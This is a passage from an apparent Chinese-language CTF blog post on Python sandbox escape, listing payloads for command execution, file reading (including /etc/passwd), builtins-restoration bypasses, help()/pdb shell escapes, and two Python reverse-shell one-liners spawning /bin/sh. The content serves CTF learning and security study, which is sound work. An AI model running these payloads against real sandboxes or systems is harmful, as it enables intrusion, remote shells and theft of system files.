class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvpe</span></span><br><span class="line">os.execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure>



<h6 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h6 id="pty模块"><a href="#pty模块" class="headerlink" title="pty模块"></a>pty模块</h6><p><strong>pty.spawn</strong></p>
<p>仅限于linux环境</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="importlib-模块"><a href="#importlib-模块" class="headerlink" title="importlib 模块"></a>importlib 模块</h6><p><code>importlib</code>模块主要被用于动态地在运行时进行导入。也就是说，该模块使开发者能够在程序运行过程中动态地导入和使用模块。这在需要动态改变（或增加）程序的行为时非常有用。例如，根据程序的配置或用户的输入，你可能需要导入和使用不同的模块。</p>
<p>比如，<code>importlib.import_module()</code>函数，这是一个简化了 <code>importlib.__import__()</code>的函数，用户可以通过它动态地导入指定的模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3可以，Python2没有该函数</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h6><p>这个已经比较常见了，该模块通过modules()函数获取os模块并执行命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="builtins-利用"><a href="#builtins-利用" class="headerlink" title="__builtins__利用"></a><code>__builtins__</code>利用</h6><p><code>__builtins__</code>是一个builtins模块的一个引用，其中包含Python的内置名称。这个模块自动在所有模块的全局命名中导入。当然也可以使用 <code>import builtins</code> 来导入</p>
<p><strong>它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len、eval 等函数，而无需导入任何模块的原因。</strong></p>
<p>我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 <code>__builtins__</code>：<br><img src="/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529163826211.png" alt="image-20240529163826211"></p>
<p>内置的函数中 open 与文件操作相关，（python2 中为 file 函数）:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><code>__builtins__</code>除了读取文件之外还可以通过调用其 <code>__import__</code> 属性来引入别的模块执行命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>由于每个导入的模块都会留存一个 <code>__builtins__</code> 属性，因此我们可以在任意的模块中通过<code>__builtins__</code>来引入模块或者执行文件操作。需要注意的是，<code>__builtins__</code>在模块级别和全局级别的表现有所不同。</p>
<p>在全局级别（也就是你在Python交互式解释器中直接查看<code>__builtins__</code>时），<code>__builtins__</code>实际上是一个模块<code>&lt;module &#39;__builtin__&#39; (built-in)&gt;</code>。</p>
<p>在模块级别（也就是你在一个Python脚本中查看<code>__builtins__</code>），<code>__builtins__</code>是一个字典，这个字典包含了<code>__builtin__</code>模块中所有的函数和类。</p>
<p>因此，当通过其他模块的 <code>__builtins__</code>时，如<code>__import__(&#39;types&#39;).__builtins__</code>时，实际上看到的是一个字典，包含了所有的内建函数和类。此时调用的方式有所变化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__import__&#x27;</span>])</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure>



<h6 id="help函数"><a href="#help函数" class="headerlink" title="help函数"></a>help函数</h6><p>在python中输入 help() 可以得到一个help的交互式窗口，在窗口里面可以输入python内置函数或方法或模块进入相关帮助文档查看他们的用法。而有的帮助文档由于篇幅较长，需要使用分页工具进行分页。在Linux中，less 和 more 都是常用的分页工具。默认情况下，Python 解释器会使用 less 工具来分页显示帮助信息。无论是 less 还是 more 命令，帮助信息过长时，最后一行都会有一个 –MORE– 标识，<strong>这个时候一般在后面输入 <code>!sh</code> ，会进入shell模式，可以执行任意shell指令。</strong></p>
<p>因此在这个方法中可以首先输入 <code>help()</code> ，进入到help界面，然后找个模块，例如 os 输入，此时就会显示 os 模块的帮助页面，输入 <code>!ls</code> 即可进行rce。</p>
<p><strong>比如下方：</strong><br>先输入help()，再输入os，在如下命令执行即可。</p>
<p><img src="/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529204041780.png" alt="image-20240529204041780"></p>
<h6 id="breakpoint函数"><a href="#breakpoint函数" class="headerlink" title="breakpoint函数"></a>breakpoint函数</h6><p>pdb 模块定义了一个交互式源代码调试器，用于Python程序。它支持在源码行间设置（有条件的）断电和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文运行任意Python代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 <code>breakpoint()</code>后可以打开pdb代码调试器，在其中就可以执行任意python代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;flag=NSSCTF&#123;73ddf7db-40d6-4514-a76b-08303756ddba&#125;\n&#x27;</span></span><br><span class="line">(Pdb) </span><br></pre></td></tr></table></figure>

<h6 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h6><p>这个在上面那个<code>audit hook 的沙箱</code>那里的payload已经说过了，就是一个外部函数库，用法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">libc.system(<span class="string">&#x27;ls ./&#x27;</span>.encode())  <span class="comment"># 使用 encode() 方法将字符串转换为字节字符串</span></span><br><span class="line"></span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure>

<h6 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h6><p>可以<strong>创建新线程</strong>，从而利用新的线程来执行函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">t = threading.Thread(target=func)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line">用于题目：</span><br><span class="line"><span class="comment"># eval, exec 都可以执行的版本</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>).Thread(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br><span class="line"><span class="comment"># exec可执行</span></span><br><span class="line"><span class="keyword">import</span> threading,os; threading.Thread(target=<span class="keyword">lambda</span>: os.system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure>

<p><strong>新线程是并行运行的，并不会阻止程序的主线程或其他线程的执行</strong>。线程可以用来执行后台任务，如计算密集型任务或I&#x2F;O操作，而不会阻塞程序的其他部分。</p>
<h6 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h6><p><code>multiprocessing</code>是Python的一个内置模块，它支持<strong>生成进程</strong>并实现并行执行。它允许你创建新的独立于主进程的进程，这些新的进程可以在系统中并行运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p = multiprocessing.Process(target=func) </span><br><span class="line">p.start()</span><br><span class="line"></span><br><span class="line">用于题目（差不多的，稍微根据上面改改就行）：</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure>

<p>这个模块的工作方式和 <code>threading</code> 模块类似，但下面是一些关键区别：</p>
<ol>
<li>进程：每个进程都有自己的内存空间，因此在一个进程中进行的任何更改都不会影响其他进程。</li>
<li>线程：所有线程共享同一内存空间，因此在一个线程中进行的任何更改都可能影响其他线程。</li>
</ol>
<p>因此，实际上，你可以想象 <code>multiprocessing</code> 模块创建的进程就像是完全独立的小程序，它们在主程序的控制下运行，并且彼此之间不会互相干扰。</p>
<h6 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a>_posixsubprocess</h6><p><code>_posixsubprocess</code> 是Python的一个内部模块，<strong>这个模块常在内部创建子进程</strong>，主要的函数是 <code>fork_exec()</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合<code>__loader__.load_module(fullname)</code>导入模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>看上面这两个代码应该是只有<code>exec</code>能用，也许<code>eval+compile</code>也能。</p>
<h5 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h5><h6 id="file-类"><a href="#file-类" class="headerlink" title="file 类"></a>file 类</h6><p>python2有这个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure>



<h6 id="open-函数"><a href="#open-函数" class="headerlink" title="open 函数"></a>open 函数</h6><p>还是比较常用的了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#__builtins__ 一般是一个内置的模块,可以不用import引入</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h6 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a>codecs 模块</h6><p><code>codecs</code> 是Python的一个内置模块，它提供了许多在处理文本时非常有用的功能，包括文本编码&#x2F;解码，数据转换等。这个模块支持很多种文本编码，包括但不限于UTF-8, ASCII, ISO-8859-1等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p>与内置的 <code>open()</code> 函数相比，<code>codecs.open()</code> 可以用更简便的方式处理文件中的编码问题。</p>
<h6 id="get-data-函数"><a href="#get-data-函数" class="headerlink" title="get_data 函数"></a>get_data 函数</h6><p><strong>FileLoader 类</strong>,注意找到这个类再利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].get_data(0,&quot;server.py&quot;)</span><br></pre></td></tr></table></figure>



<h6 id="linecache-模块"><a href="#linecache-模块" class="headerlink" title="linecache 模块"></a>linecache 模块</h6><p><strong>getlines 函数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line">linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>getline 函数需要第二个参数指定行号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getline(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h5 id="读目录"><a href="#读目录" class="headerlink" title="读目录"></a>读目录</h5><h6 id="os模块-1"><a href="#os模块-1" class="headerlink" title="os模块"></a>os模块</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">读取根目录文件：</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">读取当前目录的所有文件和文件夹：</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;./&#x27;</span>) </span><br></pre></td></tr></table></figure>

<h6 id="glob模块"><a href="#glob模块" class="headerlink" title="glob模块"></a>glob模块</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码使用了Python的 <code>glob</code> 模块来匹配所有以 “f” 开头的文件名。</p>
<h5 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h5><h6 id="获取当前环境的属性和函数"><a href="#获取当前环境的属性和函数" class="headerlink" title="获取当前环境的属性和函数"></a>获取当前环境的属性和函数</h6><p><strong>dir()与<code>__dict__</code></strong></p>
<p>这两种方法都是一个目的，列出模组&#x2F;类&#x2F;对象 下面所有的属性和函数。这在沙盒逃逸中是很有用的,<strong>可以找到隐藏在其中的一些东西</strong>，对于这个的应用还是比较重要的，可以看看另一篇文章的calc_jail_beginner_level5(JAIL)</p>
<p><strong>dir()</strong> 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">简单看看：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;,&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>,  ]</span><br></pre></td></tr></table></figure>

<p>同样的<code>sys.modules</code>也是可以看到已定义的全部的函数和变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">main_module = sys.modules[__name__]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(main_module))</span><br></pre></td></tr></table></figure>



<h6 id="获取python版本"><a href="#获取python版本" class="headerlink" title="获取python版本"></a>获取python版本</h6><p><strong>sys模块</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure>

<p><strong>platform 模块</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure>

<h6 id="获取linux版本"><a href="#获取linux版本" class="headerlink" title="获取linux版本"></a>获取linux版本</h6><p>platform 模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure>

<h6 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure>

<h5 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h5><h6 id="global函数"><a href="#global函数" class="headerlink" title="global函数"></a>global函数</h6><p><code>globals()</code>直接用就行，可以获取所有的全局变量</p>
<h6 id="help函数-1"><a href="#help函数-1" class="headerlink" title="help函数"></a>help函数</h6><p>help函数月可以获取某个模块的帮助信息，包括全局变量，输入<code>__main__</code>之后可以获取当前模块的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help&gt;__main__</span><br></pre></td></tr></table></figure>

<p>相比 globals() 而言 help() 更短，在一些限制长度的题目中有利用过这个点。</p>
<h6 id="vars函数"><a href="#vars函数" class="headerlink" title="vars函数"></a>vars函数</h6><p><code>vars()</code>函数返回该对象的命名空间中的所有属性以字典的形式表示，当前模块的所有变量也会包含在里面，一些过滤<code>globals</code>和<code>help</code>函数的场景可以尝试使用<code>vars()</code>。</p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="绕过删除模块或方法"><a href="#绕过删除模块或方法" class="headerlink" title="绕过删除模块或方法"></a>绕过删除模块或方法</h4><p>在一些沙箱中，可能会对某些模块或者模块的某些方法使用<code>del</code>关键字进行删除。例如删除builtins模块的eval方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="reload-重新加载"><a href="#reload-重新加载" class="headerlink" title="reload 重新加载"></a>reload 重新加载</h5><p>reload函数可以重新加载模块，这样被删除的函数就能被重新加载</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure>

<p>在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.reload(__builtins__)</span><br></pre></td></tr></table></figure>

<p>但是注意一个问题，新版的python 即使运行了 importlib.reload 也无法恢复了。</p>
<h5 id="恢复sys-modules"><a href="#恢复sys-modules" class="headerlink" title="恢复sys.modules"></a>恢复sys.modules</h5><p>一些过滤中可能将 <code>sys.modules[&#39;os&#39;]</code> 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">688</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Popen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">1708</span>, <span class="keyword">in</span> Popen</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED,</span></span><br><span class="line"><span class="params">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span 